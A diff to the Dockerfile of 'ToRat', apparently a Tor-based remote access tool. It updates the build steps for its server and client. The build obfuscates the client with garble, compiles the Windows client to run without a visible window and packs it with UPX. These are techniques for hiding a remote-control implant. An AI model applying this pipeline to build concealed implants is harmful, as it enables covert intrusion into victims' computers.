@@ -1,12 +1,12 @@
 FROM lu4p/tor-static:latest
-RUN GO111MODULE=on go get mvdan.cc/garble
+RUN go version
+RUN go install mvdan.cc/garble@latest
 RUN mkdir /ToRat
 WORKDIR /ToRat
 COPY go.mod .
 COPY go.sum .
 
 RUN go mod download -x
-RUN GO111MODULE=on go install github.com/lu4p/binclude/cmd/binclude
 
 RUN mkdir -p /dist/server && mkdir -p /dist/client
 
@@ -14,9 +14,6 @@ COPY . .
 
 # Generate keys and certificates
 RUN cd ./keygen && go run .
-
-# Include Certificate in the binary
-RUN cd ./torat_client && binclude
 
 # Build ToRat_server
 RUN cd ./cmd/server && go build -o /dist/server/ToRat_server
@@ -30,6 +27,6 @@ RUN cd ./cmd/client && garble -literals -tiny -seed=random build -ldflags="-extl
 # Build Windows Client
 RUN cd /go/pkg/mod/github.com/cretz/tor-static && unzip -o tor-static-windows-amd64.zip 
 RUN cd ./cmd/client && GOOS=windows GOARCH=amd64 CC=x86_64-w64-mingw32-gcc CXX=x86_64-w64-mingw32-g++ garble -literals -tiny -seed=random build -tags "osusergo,netgo,tor" --ldflags "-H windowsgui" -o /dist/client/client_windows.exe
-RUN upx /dist/client/client_windows.exe --force
+RUN upx /dist/client/client_windows.exe
 
 CMD cp /dist/* /dist_ext -rf && ls /dist_ext && cd ./cmd/server/ && /dist_ext/server/ToRat_server
